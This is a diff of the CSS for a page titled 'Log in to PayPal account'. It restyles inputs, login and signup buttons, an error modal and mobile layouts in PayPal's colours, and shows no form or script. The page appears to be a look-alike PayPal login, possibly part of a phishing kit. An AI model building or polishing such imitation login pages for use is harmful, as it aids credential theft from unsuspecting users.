@@ -4,182 +4,195 @@
   <meta charset="UTF-8">
   <title>Log in to PayPal account</title>
   <style>
-    /* Same CSS as before... no changes needed here */
-    * {
-      box-sizing: border-box;
-    }
+  * {
+    box-sizing: border-box;
+  }
 
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f2f4f7;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #f2f4f7;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    padding: 10px;
+  }
 
+  .container {
+    background-color: #fff;
+    padding: 32px 24px;
+    border-radius: 16px;
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+    width: 100%;
+    max-width: 400px;
+    text-align: center;
+  }
+
+  .container img {
+    height: 50px;
+    margin-bottom: 24px;
+  }
+
+  input[type="text"],
+  input[type="password"] {
+    width: 100%;
+    padding: 16px;
+    margin: 12px 0;
+    border: 1px solid #dfe3e8;
+    border-radius: 10px;
+    font-size: 16px;
+  }
+
+  input:focus {
+    outline: none;
+    border-color: #0070ba;
+  }
+
+  .btn-login,
+  .btn-signup {
+    padding: 14px;
+    font-size: 16px;
+    border-radius: 10px;
+    width: 100%;
+    cursor: pointer;
+    margin-top: 12px;
+    transition: background-color 0.3s;
+  }
+
+  .btn-login {
+    background-color: #0070ba;
+    color: white;
+    border: none;
+  }
+
+  .btn-login:hover {
+    background-color: #005c9e;
+  }
+
+  .btn-signup {
+    background-color: white;
+    color: #0070ba;
+    border: 2px solid #0070ba;
+  }
+
+  .btn-signup:hover {
+    background-color: #f1faff;
+  }
+
+  .forgot {
+    text-align: left;
+    font-size: 13px;
+    color: #0070ba;
+    margin-top: 6px;
+  }
+
+  .language {
+    font-size: 13px;
+    margin-top: 18px;
+    color: #5f6368;
+  }
+
+  .modal {
+    display: none;
+    position: fixed;
+    z-index: 999;
+    left: 0;
+    top: 0;
+    width: 100vw;
+    height: 100vh;
+    background: rgba(0, 0, 0, 0.45);
+    backdrop-filter: blur(3px);
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+
+  .modal-content {
+    background: white;
+    padding: 30px 24px;
+    border-radius: 16px;
+    width: 100%;
+    max-width: 400px;
+    text-align: center;
+    box-shadow: 0 12px 30px rgba(0, 0, 0, 0.2);
+    animation: slideUp 0.3s ease-out;
+  }
+
+  .modal-content h2 {
+    color: #d9534f;
+    margin-bottom: 10px;
+    font-size: 20px;
+  }
+
+  .modal-content p {
+    margin: 12px 0 20px;
+    color: #333;
+    line-height: 1.4;
+    font-size: 15px;
+  }
+
+  .close-btn {
+    background-color: #0070ba;
+    color: white;
+    padding: 12px 24px;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 15px;
+    transition: background-color 0.3s;
+  }
+
+  .close-btn:hover {
+    background-color: #005c9e;
+  }
+
+  .error {
+    color: red;
+    font-size: 13px;
+    text-align: left;
+    margin-top: -8px;
+    margin-bottom: 10px;
+  }
+
+  hr {
+    border: none;
+    height: 1px;
+    background: #e4e4e4;
+    margin: 25px 0;
+  }
+
+  @media (max-width: 480px) {
     .container {
-      background-color: #fff;
-      padding: 40px 30px;
-      border-radius: 16px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
-      width: 360px;
-      text-align: center;
-      position: relative;
-      z-index: 1;
+      padding: 24px 18px;
     }
 
-    .container img {
-      height: 50px;
-      margin-bottom: 30px;
+    .modal-content {
+      padding: 24px 20px;
     }
 
     input[type="text"],
     input[type="password"] {
-      width: 100%;
+      font-size: 15px;
       padding: 14px;
-      margin: 10px 0;
-      border: 1px solid #dfe3e8;
-      border-radius: 10px;
-      font-size: 14px;
-      transition: border-color 0.3s;
     }
 
-    input:focus {
-      outline: none;
-      border-color: #0070ba;
-    }
-
-    .btn-login {
-      background-color: #0070ba;
-      color: white;
-      padding: 14px;
-      border: none;
-      border-radius: 10px;
-      width: 100%;
-      cursor: pointer;
-      font-size: 16px;
-      margin-top: 10px;
-      transition: background-color 0.3s;
-    }
-
-    .btn-login:hover {
-      background-color: #005c9e;
-    }
-
+    .btn-login,
     .btn-signup {
-      background-color: white;
-      color: #0070ba;
-      border: 2px solid #0070ba;
-      padding: 14px;
-      border-radius: 10px;
-      width: 100%;
-      cursor: pointer;
-      font-size: 16px;
-      margin-top: 10px;
-      transition: background-color 0.3s;
-    }
-
-    .btn-signup:hover {
-      background-color: #f1faff;
-    }
-
-    .forgot {
-      text-align: left;
-      font-size: 13px;
-      color: #0070ba;
-      margin-top: 8px;
-    }
-
-    .language {
-      font-size: 13px;
-      margin-top: 20px;
-      color: #5f6368;
-    }
-
-    .modal {
-      display: none;
-      position: fixed;
-      z-index: 999;
-      left: 0;
-      top: 0;
-      width: 100vw;
-      height: 100vh;
-      background: rgba(0, 0, 0, 0.45);
-      backdrop-filter: blur(3px);
-      justify-content: center;
-      align-items: center;
-      animation: fadeIn 0.3s ease-in-out;
-    }
-
-    .modal-content {
-      background: white;
-      padding: 30px 25px;
-      border-radius: 16px;
-      width: 90%;
-      max-width: 400px;
-      text-align: center;
-      box-shadow: 0 12px 30px rgba(0,0,0,0.2);
-      animation: slideUp 0.3s ease-out;
-    }
-
-    .modal-content h2 {
-      color: #d9534f;
-      margin-bottom: 10px;
+      font-size: 15px;
     }
 
     .modal-content p {
-      margin: 15px 0 25px;
-      color: #333;
-      line-height: 1.4;
+      font-size: 14px;
     }
 
     .close-btn {
-      background-color: #0070ba;
-      color: white;
-      padding: 10px 24px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
       font-size: 14px;
-      transition: background-color 0.3s;
+      padding: 10px 20px;
     }
+  }
+</style>
 
-    .close-btn:hover {
-      background-color: #005c9e;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-    @keyframes slideUp {
-      from {
-        transform: translateY(30px);
-        opacity: 0;
-      }
-      to {
-        transform: translateY(0);
-        opacity: 1;
-      }
-    }
-
-    .error {
-      color: red;
-      font-size: 13px;
-      margin-top: 4px;
-      text-align: left;
-    }
-
-    hr {
-      border: none;
-      height: 1px;
-      background: #e4e4e4;
-      margin: 25px 0;
-    }
-  </style>
 </head>
 <body>
 
